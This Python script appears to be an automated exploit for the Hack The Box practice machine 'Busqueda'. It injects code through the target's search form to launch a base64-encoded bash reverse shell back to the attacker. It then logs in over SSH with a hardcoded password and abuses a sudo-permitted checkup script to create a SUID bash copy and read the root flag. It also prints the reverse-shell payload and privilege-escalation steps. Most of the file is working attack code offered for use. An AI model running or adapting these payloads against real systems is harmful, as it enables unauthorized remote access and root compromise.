import sys, os
import time as cm
import requests
import re
import subprocess
import paramiko
from threading import Thread
import time as cm
from colorama import Fore, init
from consolemenu import SelectionMenu

init(autoreset=True)

def banner():
    os.system("clear")
    bnn = """
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⢿⣧⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣶⡀⠀⠀⢀⡴⠛⠁⠀⠘⣿⡄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣷⣤⡴⠋⠀⠀⠀⠀⠀⢿⣇⠀         ▓█████ ▄████▄   ██░ ██  ██ ▄█▀                       █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⣿⠀         ▓█   ▀▒██▀ ▀█  ▓██░ ██▒ ██▄█▒                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠈⣿⡀         ▒███  ▒▓█    ▄ ▒██▀▀██░▓███▄░                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢏⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⡇         ▒▓█  ▄▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄                        █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣷⣾⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢿⡇         ░▒████▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄                       █
                  ⠀⠀⠀⠀⠀⠀⠀⢀⡾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⢸⡇         ░░ ▒░ ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒                       █
                  ⠀⠀⠀⠀⠀⠀⢠⡞⠁⢹⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⢸⠀          ░ ░  ░ ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░                       █
                  ⠀⠀⠀⠀⠀⣠⠟⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⢸⠀          ░  ░         ░  ░░ ░░ ░░ ░                          █
                  ⠀⠀⠀⠀⣰⠏⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⣴⠋⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⣼⠃⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀          ___ ___ ___ ___                                     █
                  ⢀⣼⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀         (___|___|___|___)                                    █
                  ⡾⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀         G1thub: https://github.com/l44x                      █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀         T4skT00l: Pw3ned-R00t [ Busqueda ]                   █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀    ___ ___ ___ ___                                           █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀   (___|___|___|___)                                          █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠃                                                              █
                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                                              █
                  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
    """
    print(Fore.GREEN + f"{bnn}")
    
global machine_ip
global target_machine

def commands_send(cmd):
    try:
        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r {e}")

machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
target_machine="10.10.11.208"

def checker_status():
    try:
        check_hackthebox_vpn="ifconfig | grep tun0"
        control_status_vpn=commands_send(check_hackthebox_vpn)
        cm.sleep(.5)
        if control_status_vpn:
            print(Fore.RED + f"\n\t\t~ [HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
            print(Fore.LIGHTWHITE_EX + f"\t\t\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n")
        else:
            print(Fore.RED + f"[!] Actve ur HackTheBox VPN")
            sys.exit(1)
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [Vpn-Status] {e}")

def user_default_hackthebox():
    try:
        whoami_default=commands_send('whoami')
        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ') # if hackthebox change ip, change this parameter.
        #machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
        print("----------------------------------------------------")
        print(Fore.CYAN + f"\t\t ~ [Default User Connection]")
        print(Fore.RED + f"\n\t\t\t\t\t[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
        print(Fore.RED + f"\t\t\t\t\t[User-default] > " + Fore.YELLOW + f"{whoami_default}")
        if machine_default_ip:
            print(Fore.RED + f"\t\t\t\t\t[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
            print(Fore.RED + f"\t\t\t\t\t[Target Path Exploit] > " + Fore.YELLOW + f"http://searcher.htb/")
        else:
            print(Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked BoardLight Network")
        print("----------------------------------------------------\n")
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [User-Default] {e}")
        
def enter_user_svc_shell():
    try:
        portListen = input(Fore.GREEN+"\t\t\t\t\t[Exploit Message] > " +Fore.CYAN+ "What you port u listen? > "+Fore.YELLOW)
        print(Fore.RED + f"\t\t\t\t\t[Exploit Message] > " + Fore.YELLOW + f"Please Listen on port {portListen}")
        input(f"\t\t\t\t\t[Exploit Message] > " + Fore.WHITE + "Press ENTER if u ready")
        b64_shell=commands_send(f"echo '/bin/bash -l > /dev/tcp/{machine_ip}/{portListen} 0<&1 2>&1' | base64")
        #print(b64_shell)
        print(Fore.LIGHTMAGENTA_EX + f"\t\t\t\t\t[Exploit Message] > " + Fore.GREEN + f"Connection Command Succeslly :)")
        commands_send(f"curl -s -X POST \"http://searcher.htb/search\" -d \"engine=Google&query=',__import__('os').system('echo+{b64_shell}|base64+-d|bash+-i'))#\"")    
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [SVC User] {e}")

def create_backup_file():
    print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"If failed connect to root, use manual privilege scale in sroot.txt")
    commands_send(""" echo "
> echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/data\nchmod 4777 /tmp/data' > full-checkup.sh
> cat full-checkup.sh 
> cp /bin/bash /tmp/data
> chmod 4777 /tmp/data
> chmod +x full-checkup.sh 
> sudo -S python3 /opt/scripts/system-checkup.py full-checkup
> jh1usoih2bkjaspwe92
> /tmp/data -p
> cat /root/root.txt" > sroot.txt
""")
    print(Fore.RED + f"\t\t\t\t\t[Exploit - Message] > " + Fore.GREEN + f"sroot.txt successfully created.")


def all_commnds_use():
    print("----------------------------------------------------")
    print(Fore.MAGENTA + f"\t\t ~ [M3NU C0MM4NDS :3]\n")
    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"❯ curl -s -X POST \"http://searcher.htb/search\" -d \"engine=Google&query=',__import__('os').system('echo+L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTYuNS85MDAxIDA8JjEgMj4mMQ==|base64+-d|bash+-i'))#\"")
    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"❯ cd /var/www/app/.git | cat config")
    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"❯ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq .")
    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"❯ sudo python3 /opt/scripts/system-checkup.py docker-inspect '{{json .NetworkSettings.Networks}}' mysql_db | jq .")
    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Message] > " + Fore.RED + f"❯ And sroot.txt for root user.")
    print("----------------------------------------------------")

def unlocked():
    try:
        checker_status()
        user_default_hackthebox()
        while True:
            users=["svc", "root", "used commands","exit"]
            client = paramiko.SSHClient()
            host = target_machine
            username = "svc"
            password = "jh1usoih2bkjaspwe92"
            print("----------------------------------------------------")
            print(Fore.MAGENTA + f"\t\t ~ [M3NU 0PT1ONS S3L3CT10N]\n")
            for index,user in enumerate(users):
                print(Fore.RED + f"\t\t\t\t\t[Exploit - Menu Options] > " + Fore.GREEN + f"{index+1} > {user}")
            
            print(Fore.LIGHTYELLOW_EX+f"\t\t\t\t\t/----------------------------/")
            user_call= int(input(f"\t\t\t\t\t ~ What ur user select? > "))
            print("----------------------------------------------------\n")
            if user_call == 1:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to svc-user :)]\n")
                    cm.sleep(.5)
                    enter_user_svc_shell()
                    print("----------------------------------------------------\n")
                except:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            elif user_call == 2:
                try:
                    print("----------------------------------------------------")
                    print(Fore.CYAN + f"\t\t ~ [Connection to root :)]\n")
                    cm.sleep(.5)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Path Sudoers] > " + Fore.GREEN + f"/opt/scripts/system-checkup.py full-checkup")
                    cm.sleep(.5)
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(host, username=username, password=password)
                    print(Fore.RED + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.GREEN + f"Successfully")
                    create_backup_file()
                    #init shell
                    shell = client.invoke_shell()
                    # copy /bin/bash and suid permission.
                    shell.send(f"cd /home/svc" + "\n"); cm.sleep(1)
                    shell.send("cat <<EOF > full-checkup.sh\n") ; cm.sleep(1)
                    shell.send("#!/bin/bash\n") ; cm.sleep(1)
                    shell.send("cp /bin/bash /tmp/data\n")
                    shell.send("chmod 4777 /tmp/data\n")
                    shell.send("EOF\n")
                    cm.sleep(0.6)
                    shell.send("cat full-checkup.sh" + "\n") ; cm.sleep(1)
                    shell.send("cp /bin/bash /tmp/data" + "\n"); cm.sleep(1)
                    shell.send("chmod 4777 /tmp/data" + "\n") ; cm.sleep(1)
                    shell.send("chmod +x full-checkup.sh" + "\n") ; cm.sleep(1)
                    shell.send("sudo -S python3 /opt/scripts/system-checkup.py full-checkup" + "\n"); cm.sleep(1)
                    shell.send("jh1usoih2bkjaspwe92" + "\n") ; cm.sleep(1)
                    shell.send("/tmp/data -p" + "\n"); cm.sleep(0.6)
                    shell.send("cat /root/root.txt" + "\n")
                    while True:
                        if shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")
                            
                        command = input("$ ")
                        if command.lower() in ["exit", "quit"]:
                            print("\n[!] Closing connection...")
                            break
                        
                        shell.send(command + "\n")
                        cm.sleep(0.5)

                        while shell.recv_ready():
                            output = shell.recv(1024).decode('utf-8')
                            print(output, end="")

                    shell.close()
                    client.close()
                    print("----------------------------------------------------\n")
                    break
                except paramiko.ssh_exception.NoValidConnectionsError:
                    print(Fore.YELLOW + f"\t\t\t\t\t[Exploit - Connecting...] > " + Fore.RED + f"Failed Connection. Check ur connection vpn or machine.")
                    break
            elif user_call == 3:
                all_commnds_use()
                break
            elif user_call == 4:
                break
    except subprocess.CalledProcessError as e:
        print(f"OcurredErr0r [root-user] {e}")

if __name__ == '__main__':
    banner()
    unlocked()
